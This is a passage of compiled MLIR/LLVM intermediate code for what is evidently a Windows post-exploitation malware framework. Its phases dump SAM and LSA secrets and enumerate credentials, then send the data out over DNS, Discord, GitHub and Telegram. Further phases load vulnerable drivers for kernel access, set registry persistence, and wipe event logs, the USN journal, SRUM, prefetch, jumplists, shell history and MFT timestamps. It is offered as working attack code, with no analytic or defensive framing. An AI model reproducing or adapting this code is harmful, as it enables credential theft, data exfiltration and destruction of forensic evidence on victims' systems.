    llvm.br ^bb6
  ^bb6:  // 2 preds: ^bb4, ^bb5
    %72 = llvm.call @jocky_registry_dump_sam() : () -> i32
    %73 = llvm.icmp "sgt" %72, %2 : i32
    llvm.cond_br %73, ^bb7, ^bb8
  ^bb7:  // pred: ^bb6
    %74 = llvm.getelementptr %13[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<28 x i8>
    llvm.call @println(%74) : (!llvm.ptr) -> ()
    llvm.br ^bb8
  ^bb8:  // 2 preds: ^bb6, ^bb7
    %75 = llvm.call @jocky_registry_dump_lsa_secrets() : () -> i32
    %76 = llvm.icmp "sgt" %75, %2 : i32
    llvm.cond_br %76, ^bb9, ^bb10
  ^bb9:  // pred: ^bb8
    %77 = llvm.getelementptr %14[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<27 x i8>
    llvm.call @println(%77) : (!llvm.ptr) -> ()
    llvm.br ^bb10
  ^bb10:  // 2 preds: ^bb8, ^bb9
    %78 = llvm.call @jocky_credentials_enumerate() : () -> !llvm.ptr
    llvm.store %78, %22 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %79 = llvm.load %22 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %80 = llvm.call @jocky_data_hex_encode(%79, %15) : (!llvm.ptr, i32) -> !llvm.ptr
    %81 = llvm.call @strlen(%80) : (!llvm.ptr) -> i64
    %82 = llvm.sext %2 : i32 to i64
    %83 = llvm.icmp "sgt" %81, %82 : i64
    llvm.cond_br %83, ^bb11, ^bb12
  ^bb11:  // pred: ^bb10
    %84 = llvm.getelementptr %16[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<31 x i8>
    llvm.call @println(%84) : (!llvm.ptr) -> ()
    llvm.br ^bb12
  ^bb12:  // 2 preds: ^bb10, ^bb11
    %85 = llvm.getelementptr %17[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<22 x i8>
    %86 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %87 = llvm.call @strlen(%86) : (!llvm.ptr) -> i64
    %88 = llvm.call @string(%87) : (i64) -> !llvm.ptr
    %89 = llvm.call @jocky_str_concat(%85, %88) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %90 = llvm.getelementptr %18[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<22 x i8>
    %91 = llvm.call @jocky_str_concat(%89, %90) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%91) : (!llvm.ptr) -> ()
    %92 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%92) : (!llvm.ptr) -> ()
    %93 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %94 = llvm.call @strlen(%93) : (!llvm.ptr) -> i64
    %95 = llvm.sext %2 : i32 to i64
    %96 = llvm.icmp "sgt" %94, %95 : i64
    llvm.return %96 : i1
  }
  llvm.func @phase_encrypt_data() -> i1 {
    %0 = llvm.mlir.constant(1 : i32) : i32
    %1 = llvm.mlir.addressof @".str.50" : !llvm.ptr
    %2 = llvm.mlir.constant(0 : i32) : i32
    %3 = llvm.mlir.addressof @".str.18" : !llvm.ptr
    %4 = llvm.mlir.constant(66 : i32) : i32
    %5 = llvm.mlir.addressof @".str.51" : !llvm.ptr
    %6 = llvm.mlir.addressof @".str.52" : !llvm.ptr
    %7 = llvm.mlir.constant(6 : i32) : i32
    %8 = llvm.mlir.addressof @".str.53" : !llvm.ptr
    %9 = llvm.mlir.addressof @".str.54" : !llvm.ptr
    %10 = llvm.mlir.addressof @".str.55" : !llvm.ptr
    %11 = llvm.mlir.addressof @".str.27" : !llvm.ptr
    %12 = llvm.mlir.constant(true) : i1
    %13 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %14 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %15 = llvm.getelementptr %1[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<40 x i8>
    llvm.call @println(%15) : (!llvm.ptr) -> ()
    %16 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %17 = llvm.call @strlen(%16) : (!llvm.ptr) -> i64
    %18 = llvm.sext %2 : i32 to i64
    %19 = llvm.icmp "sgt" %17, %18 : i64
    llvm.cond_br %19, ^bb1, ^bb2
  ^bb1:  // pred: ^bb0
    %20 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %21 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %22 = llvm.call @strlen(%21) : (!llvm.ptr) -> i64
    %23 = llvm.trunc %22 : i64 to i32
    %24 = llvm.trunc %4 : i32 to i8
    llvm.call @jocky_decrypt_xor(%20, %23, %24, %0) : (!llvm.ptr, i32, i8, i32) -> ()
    %25 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<31 x i8>
    llvm.call @println(%25) : (!llvm.ptr) -> ()
    %26 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %27 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %28 = llvm.call @strlen(%27) : (!llvm.ptr) -> i64
    %29 = llvm.trunc %28 : i64 to i32
    %30 = llvm.getelementptr %6[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<7 x i8>
    llvm.call @jocky_decrypt_rc4(%26, %29, %30, %7) : (!llvm.ptr, i32, !llvm.ptr, i32) -> ()
    %31 = llvm.getelementptr %8[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<31 x i8>
    llvm.call @println(%31) : (!llvm.ptr) -> ()
    %32 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %33 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %34 = llvm.call @strlen(%33) : (!llvm.ptr) -> i64
    %35 = llvm.trunc %34 : i64 to i32
    %36 = llvm.call @jocky_compress_data(%32, %35) : (!llvm.ptr, i32) -> !llvm.ptr
    llvm.store %36, %13 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %37 = llvm.getelementptr %9[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<24 x i8>
    llvm.call @println(%37) : (!llvm.ptr) -> ()
    %38 = llvm.load %13 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %39 = llvm.load %13 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %40 = llvm.call @strlen(%39) : (!llvm.ptr) -> i64
    %41 = llvm.trunc %40 : i64 to i32
    %42 = llvm.call @jocky_data_base64_encode(%38, %41) : (!llvm.ptr, i32) -> !llvm.ptr
    llvm.store %42, %14 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %43 = llvm.getelementptr %10[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<25 x i8>
    %44 = llvm.load %14 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %45 = llvm.call @strlen(%44) : (!llvm.ptr) -> i64
    %46 = llvm.call @string(%45) : (i64) -> !llvm.ptr
    %47 = llvm.call @jocky_str_concat(%43, %46) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %48 = llvm.getelementptr %11[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<7 x i8>
    %49 = llvm.call @jocky_str_concat(%47, %48) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%49) : (!llvm.ptr) -> ()
    llvm.br ^bb2
  ^bb2:  // 2 preds: ^bb0, ^bb1
    %50 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%50) : (!llvm.ptr) -> ()
    llvm.return %12 : i1
  }
  llvm.func @phase_exfiltrate() -> i1 {
    %0 = llvm.mlir.addressof @".str.56" : !llvm.ptr
    %1 = llvm.mlir.constant(0 : i32) : i32
    %2 = llvm.mlir.addressof @".str.18" : !llvm.ptr
    %3 = llvm.mlir.addressof @".str.58" : !llvm.ptr
    %4 = llvm.mlir.addressof @".str.59" : !llvm.ptr
    %5 = llvm.mlir.constant(4096 : i32) : i32
    %6 = llvm.mlir.addressof @".str.60" : !llvm.ptr
    %7 = llvm.mlir.constant(256 : i32) : i32
    %8 = llvm.mlir.addressof @".str.61" : !llvm.ptr
    %9 = llvm.mlir.constant(2000 : i32) : i32
    %10 = llvm.mlir.addressof @".str.62" : !llvm.ptr
    %11 = llvm.mlir.constant(1024 : i32) : i32
    %12 = llvm.mlir.addressof @".str.63" : !llvm.ptr
    %13 = llvm.mlir.addressof @".str.64" : !llvm.ptr
    %14 = llvm.mlir.constant(512 : i32) : i32
    %15 = llvm.mlir.addressof @".str.65" : !llvm.ptr
    %16 = llvm.mlir.addressof @".str.66" : !llvm.ptr
    %17 = llvm.mlir.constant(true) : i1
    %18 = llvm.mlir.addressof @".str.57" : !llvm.ptr
    %19 = llvm.mlir.constant(false) : i1
    %20 = llvm.getelementptr %0[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<39 x i8>
    llvm.call @println(%20) : (!llvm.ptr) -> ()
    %21 = llvm.getelementptr %2[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %22 = llvm.call @strlen(%21) : (!llvm.ptr) -> i64
    %23 = llvm.sext %1 : i32 to i64
    %24 = llvm.icmp "eq" %22, %23 : i64
    llvm.cond_br %24, ^bb1, ^bb2
  ^bb1:  // pred: ^bb0
    %25 = llvm.getelementptr %18[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<30 x i8>
    llvm.call @println(%25) : (!llvm.ptr) -> ()
    llvm.return %19 : i1
  ^bb2:  // pred: ^bb0
    %26 = llvm.getelementptr %3[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<29 x i8>
    %27 = llvm.getelementptr %2[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %28 = llvm.getelementptr %2[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %29 = llvm.getelementptr %4[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<5 x i8>
    %30 = llvm.call @jocky_exfil_front(%26, %27, %28, %29, %5) : (!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr, i32) -> i1
    llvm.cond_br %30, ^bb3, ^bb4
  ^bb3:  // pred: ^bb2
    %31 = llvm.getelementptr %6[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<36 x i8>
    llvm.call @println(%31) : (!llvm.ptr) -> ()
    llvm.br ^bb4
  ^bb4:  // 2 preds: ^bb2, ^bb3
    %32 = llvm.getelementptr %3[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<29 x i8>
    %33 = llvm.getelementptr %2[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %34 = llvm.call @jocky_exfil_dns(%32, %33, %7) : (!llvm.ptr, !llvm.ptr, i32) -> i1
    llvm.cond_br %34, ^bb5, ^bb6
  ^bb5:  // pred: ^bb4
    %35 = llvm.getelementptr %8[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<43 x i8>
    llvm.call @println(%35) : (!llvm.ptr) -> ()
    llvm.br ^bb6
  ^bb6:  // 2 preds: ^bb4, ^bb5
    %36 = llvm.getelementptr %3[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<29 x i8>
    %37 = llvm.getelementptr %2[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %38 = llvm.call @jocky_exfil_discord(%36, %37, %9) : (!llvm.ptr, !llvm.ptr, i32) -> i1
    llvm.cond_br %38, ^bb7, ^bb8
  ^bb7:  // pred: ^bb6
    %39 = llvm.getelementptr %10[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<40 x i8>
    llvm.call @println(%39) : (!llvm.ptr) -> ()
    llvm.br ^bb8
  ^bb8:  // 2 preds: ^bb6, ^bb7
    %40 = llvm.getelementptr %3[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<29 x i8>
    %41 = llvm.getelementptr %2[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %42 = llvm.getelementptr %2[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %43 = llvm.call @jocky_exfil_github(%40, %41, %42, %11) : (!llvm.ptr, !llvm.ptr, !llvm.ptr, i32) -> i1
    llvm.cond_br %43, ^bb9, ^bb10
  ^bb9:  // pred: ^bb8
    %44 = llvm.getelementptr %12[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<39 x i8>
    llvm.call @println(%44) : (!llvm.ptr) -> ()
    llvm.br ^bb10
  ^bb10:  // 2 preds: ^bb8, ^bb9
    %45 = llvm.getelementptr %3[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<29 x i8>
    %46 = llvm.getelementptr %2[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %47 = llvm.getelementptr %13[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<6 x i8>
    %48 = llvm.call @jocky_exfil_telegram(%45, %46, %47, %14) : (!llvm.ptr, !llvm.ptr, !llvm.ptr, i32) -> i1
    llvm.cond_br %48, ^bb11, ^bb12
  ^bb11:  // pred: ^bb10
    %49 = llvm.getelementptr %15[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<41 x i8>
    llvm.call @println(%49) : (!llvm.ptr) -> ()
    llvm.br ^bb12
  ^bb12:  // 2 preds: ^bb10, ^bb11
    %50 = llvm.getelementptr %16[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<40 x i8>
    llvm.call @println(%50) : (!llvm.ptr) -> ()
    %51 = llvm.getelementptr %2[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%51) : (!llvm.ptr) -> ()
    llvm.return %17 : i1
  }
  llvm.func @phase_kernel_exploit() -> i1 {
    %0 = llvm.mlir.constant(1 : i32) : i32
    %1 = llvm.mlir.addressof @".str.67" : !llvm.ptr
    %2 = llvm.mlir.constant(0 : i32) : i32
    %3 = llvm.mlir.addressof @DRIVERS : !llvm.ptr
    %4 = llvm.mlir.constant(0 : i64) : i64
    %5 = llvm.mlir.addressof @".str.71" : !llvm.ptr
    %6 = llvm.mlir.addressof @".str.18" : !llvm.ptr
    %7 = llvm.mlir.constant(false) : i1
    %8 = llvm.mlir.addressof @".str.68" : !llvm.ptr
    %9 = llvm.mlir.addressof @".str.69" : !llvm.ptr
    %10 = llvm.mlir.constant(1 : i64) : i64
    %11 = llvm.mlir.addressof @".str.70" : !llvm.ptr
    %12 = llvm.mlir.constant(true) : i1
    %13 = llvm.mlir.addressof @kernel_access : !llvm.ptr
    %14 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %15 = llvm.getelementptr %1[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<44 x i8>
    llvm.call @println(%15) : (!llvm.ptr) -> ()
    %16 = llvm.load %3 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %17 = llvm.call @array_len(%16) : (!llvm.ptr) -> i64
    %18 = llvm.alloca %0 x i64 {alignment = 8 : i64} : (i32) -> !llvm.ptr
    llvm.store %4, %18 {alignment = 8 : i64} : i64, !llvm.ptr
    %19 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    llvm.br ^bb1
  ^bb1:  // 2 preds: ^bb0, ^bb5
    %20 = llvm.load %18 {alignment = 8 : i64} : !llvm.ptr -> i64
    %21 = llvm.icmp "slt" %20, %17 : i64
    llvm.cond_br %21, ^bb2, ^bb6
  ^bb2:  // pred: ^bb1
    %22 = llvm.bitcast %16 : !llvm.ptr to !llvm.ptr
    %23 = llvm.getelementptr %22[%20] : (!llvm.ptr, i64) -> !llvm.ptr, !llvm.ptr
    %24 = llvm.load %23 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    llvm.store %24, %19 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %25 = llvm.call @jocky_byovd_new() : () -> !llvm.ptr
    llvm.store %25, %14 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %26 = llvm.getelementptr %8[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<16 x i8>
    %27 = llvm.getelementptr %9[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<13 x i8>
    %28 = llvm.load %14 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %29 = llvm.call @jocky_byovd_load(%26, %27, %28) : (!llvm.ptr, !llvm.ptr, !llvm.ptr) -> i1
    llvm.cond_br %29, ^bb3, ^bb4
  ^bb3:  // pred: ^bb2
    %30 = llvm.getelementptr %11[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<53 x i8>
    llvm.call @println(%30) : (!llvm.ptr) -> ()
    llvm.store %12, %13 {alignment = 1 : i64} : i1, !llvm.ptr
    %31 = llvm.load %14 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    llvm.call @jocky_byovd_destroy(%31) : (!llvm.ptr) -> ()
    llvm.return %12 : i1
  ^bb4:  // pred: ^bb2
    %32 = llvm.load %14 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    llvm.call @jocky_byovd_destroy(%32) : (!llvm.ptr) -> ()
    llvm.br ^bb5
  ^bb5:  // pred: ^bb4
    %33 = llvm.add %20, %10 : i64
    llvm.store %33, %18 {alignment = 8 : i64} : i64, !llvm.ptr
    llvm.br ^bb1
  ^bb6:  // pred: ^bb1
    %34 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<41 x i8>
    llvm.call @println(%34) : (!llvm.ptr) -> ()
    %35 = llvm.getelementptr %6[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%35) : (!llvm.ptr) -> ()
    llvm.return %7 : i1
  }
  llvm.func @phase_injection() -> i1 {
    %0 = llvm.mlir.addressof @".str.72" : !llvm.ptr
    %1 = llvm.mlir.constant(0 : i32) : i32
    %2 = llvm.mlir.addressof @".str.73" : !llvm.ptr
    %3 = llvm.mlir.addressof @".str.18" : !llvm.ptr
    %4 = llvm.mlir.constant(true) : i1
    %5 = llvm.getelementptr %0[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<43 x i8>
    llvm.call @println(%5) : (!llvm.ptr) -> ()
    %6 = llvm.getelementptr %2[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<44 x i8>
    llvm.call @println(%6) : (!llvm.ptr) -> ()
    %7 = llvm.getelementptr %3[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%7) : (!llvm.ptr) -> ()
    llvm.return %4 : i1
  }
  llvm.func @phase_persistence() -> i1 {
    %0 = llvm.mlir.addressof @".str.74" : !llvm.ptr
    %1 = llvm.mlir.constant(0 : i32) : i32
    %2 = llvm.mlir.addressof @".str.75" : !llvm.ptr
    %3 = llvm.mlir.addressof @".str.76" : !llvm.ptr
    %4 = llvm.mlir.addressof @".str.77" : !llvm.ptr
    %5 = llvm.mlir.addressof @".str.78" : !llvm.ptr
    %6 = llvm.mlir.addressof @".str.18" : !llvm.ptr
    %7 = llvm.mlir.constant(-2147483647 : i32) : i32
    %8 = llvm.mlir.addressof @".str.79" : !llvm.ptr
    %9 = llvm.mlir.constant(true) : i1
    %10 = llvm.mlir.addressof @persistence_set : !llvm.ptr
    %11 = llvm.getelementptr %0[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<48 x i8>
    llvm.call @println(%11) : (!llvm.ptr) -> ()
    %12 = llvm.getelementptr %2[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<40 x i8>
    llvm.call @println(%12) : (!llvm.ptr) -> ()
    %13 = llvm.call @jocky_patch_amcache() : () -> i1
    llvm.cond_br %13, ^bb1, ^bb2
  ^bb1:  // pred: ^bb0
    %14 = llvm.getelementptr %3[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<24 x i8>
    llvm.call @println(%14) : (!llvm.ptr) -> ()
    llvm.br ^bb2
  ^bb2:  // 2 preds: ^bb0, ^bb1
    %15 = llvm.call @jocky_patch_shimcache() : () -> i1
    llvm.cond_br %15, ^bb3, ^bb4
  ^bb3:  // pred: ^bb2
    %16 = llvm.getelementptr %4[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<26 x i8>
    llvm.call @println(%16) : (!llvm.ptr) -> ()
    llvm.br ^bb4
  ^bb4:  // 2 preds: ^bb2, ^bb3
    %17 = llvm.getelementptr %5[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<74 x i8>
    %18 = llvm.getelementptr %6[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %19 = llvm.call @jocky_registry_create_key(%7, %17, %18) : (i32, !llvm.ptr, !llvm.ptr) -> i1
    %20 = llvm.getelementptr %8[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<48 x i8>
    llvm.call @println(%20) : (!llvm.ptr) -> ()
    llvm.store %9, %10 {alignment = 1 : i64} : i1, !llvm.ptr
    %21 = llvm.getelementptr %6[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%21) : (!llvm.ptr) -> ()
    llvm.return %9 : i1
  }
  llvm.func @phase_anti_forensics() -> i1 {
    %0 = llvm.mlir.addressof @".str.80" : !llvm.ptr
    %1 = llvm.mlir.constant(0 : i32) : i32
    %2 = llvm.mlir.addressof @".str.81" : !llvm.ptr
    %3 = llvm.mlir.addressof @".str.82" : !llvm.ptr
    %4 = llvm.mlir.addressof @".str.83" : !llvm.ptr
    %5 = llvm.mlir.addressof @".str.84" : !llvm.ptr
    %6 = llvm.mlir.addressof @".str.85" : !llvm.ptr
    %7 = llvm.mlir.addressof @".str.86" : !llvm.ptr
    %8 = llvm.mlir.addressof @".str.87" : !llvm.ptr
    %9 = llvm.mlir.addressof @".str.88" : !llvm.ptr
    %10 = llvm.mlir.addressof @".str.89" : !llvm.ptr
    %11 = llvm.mlir.addressof @".str.90" : !llvm.ptr
    %12 = llvm.mlir.addressof @".str.91" : !llvm.ptr
    %13 = llvm.mlir.addressof @".str.92" : !llvm.ptr
    %14 = llvm.mlir.addressof @".str.93" : !llvm.ptr
    %15 = llvm.mlir.addressof @".str.94" : !llvm.ptr
    %16 = llvm.mlir.addressof @".str.95" : !llvm.ptr
    %17 = llvm.mlir.addressof @".str.96" : !llvm.ptr
    %18 = llvm.mlir.addressof @".str.97" : !llvm.ptr
    %19 = llvm.mlir.addressof @".str.98" : !llvm.ptr
    %20 = llvm.mlir.addressof @".str.99" : !llvm.ptr
    %21 = llvm.mlir.addressof @".str.100" : !llvm.ptr
    %22 = llvm.mlir.addressof @".str.101" : !llvm.ptr
    %23 = llvm.mlir.addressof @".str.102" : !llvm.ptr
    %24 = llvm.mlir.addressof @".str.103" : !llvm.ptr
    %25 = llvm.mlir.addressof @".str.104" : !llvm.ptr
    %26 = llvm.mlir.addressof @".str.105" : !llvm.ptr
    %27 = llvm.mlir.addressof @".str.106" : !llvm.ptr
    %28 = llvm.mlir.addressof @".str.107" : !llvm.ptr
    %29 = llvm.mlir.addressof @".str.18" : !llvm.ptr
    %30 = llvm.mlir.constant(true) : i1
    %31 = llvm.getelementptr %0[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<45 x i8>
    llvm.call @println(%31) : (!llvm.ptr) -> ()
    %32 = llvm.getelementptr %2[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<9 x i8>
    %33 = llvm.call @jocky_cleanup_event_logs(%32) : (!llvm.ptr) -> i32
    %34 = llvm.getelementptr %3[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<7 x i8>
    %35 = llvm.call @jocky_cleanup_event_logs(%34) : (!llvm.ptr) -> i32
    %36 = llvm.getelementptr %4[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<12 x i8>
    %37 = llvm.call @jocky_cleanup_event_logs(%36) : (!llvm.ptr) -> i32
    %38 = llvm.getelementptr %5[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<27 x i8>
    llvm.call @println(%38) : (!llvm.ptr) -> ()
    %39 = llvm.call @jocky_cleanup_usn_journal() : () -> i32
    %40 = llvm.icmp "sgt" %39, %1 : i32
    llvm.cond_br %40, ^bb1, ^bb2
  ^bb1:  // pred: ^bb0
    %41 = llvm.getelementptr %6[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<28 x i8>
    llvm.call @println(%41) : (!llvm.ptr) -> ()
    llvm.br ^bb2
  ^bb2:  // 2 preds: ^bb0, ^bb1
    %42 = llvm.call @jocky_clear_srum() : () -> i1
    llvm.cond_br %42, ^bb3, ^bb4
  ^bb3:  // pred: ^bb2
    %43 = llvm.getelementptr %7[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<21 x i8>
    llvm.call @println(%43) : (!llvm.ptr) -> ()
    llvm.br ^bb4
  ^bb4:  // 2 preds: ^bb2, ^bb3
    %44 = llvm.call @forensics_wipe_powershell_history() : () -> i32
    %45 = llvm.icmp "sgt" %44, %1 : i32
    llvm.cond_br %45, ^bb5, ^bb6
  ^bb5:  // pred: ^bb4
    %46 = llvm.getelementptr %8[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<33 x i8>
    llvm.call @println(%46) : (!llvm.ptr) -> ()
    llvm.br ^bb6
  ^bb6:  // 2 preds: ^bb4, ^bb5
    %47 = llvm.call @forensics_wipe_cmd_history() : () -> i32
    %48 = llvm.icmp "sgt" %47, %1 : i32
    llvm.cond_br %48, ^bb7, ^bb8
  ^bb7:  // pred: ^bb6
    %49 = llvm.getelementptr %9[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<26 x i8>
    llvm.call @println(%49) : (!llvm.ptr) -> ()
    llvm.br ^bb8
  ^bb8:  // 2 preds: ^bb6, ^bb7
    llvm.call @jocky_wipe_prefetch() : () -> ()
    %50 = llvm.getelementptr %10[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<23 x i8>
    llvm.call @println(%50) : (!llvm.ptr) -> ()
    %51 = llvm.call @jocky_wipe_jumplist() : () -> i1
    llvm.cond_br %51, ^bb9, ^bb10
  ^bb9:  // pred: ^bb8
    %52 = llvm.getelementptr %11[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<25 x i8>
    llvm.call @println(%52) : (!llvm.ptr) -> ()
    llvm.br ^bb10
  ^bb10:  // 2 preds: ^bb8, ^bb9
    %53 = llvm.call @jocky_wipe_thumbcache() : () -> i1
    llvm.cond_br %53, ^bb11, ^bb12
  ^bb11:  // pred: ^bb10
    %54 = llvm.getelementptr %12[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<30 x i8>
    llvm.call @println(%54) : (!llvm.ptr) -> ()
    llvm.br ^bb12
  ^bb12:  // 2 preds: ^bb10, ^bb11
    %55 = llvm.call @jocky_clear_recent_files() : () -> i1
    llvm.cond_br %55, ^bb13, ^bb14
  ^bb13:  // pred: ^bb12
    %56 = llvm.getelementptr %13[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<29 x i8>
    llvm.call @println(%56) : (!llvm.ptr) -> ()
    llvm.br ^bb14
  ^bb14:  // 2 preds: ^bb12, ^bb13
    %57 = llvm.call @jocky_clear_mft_timestamps() : () -> i1
    llvm.cond_br %57, ^bb15, ^bb16
  ^bb15:  // pred: ^bb14
    %58 = llvm.getelementptr %14[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<31 x i8>
    llvm.call @println(%58) : (!llvm.ptr) -> ()
    llvm.br ^bb16
  ^bb16:  // 2 preds: ^bb14, ^bb15
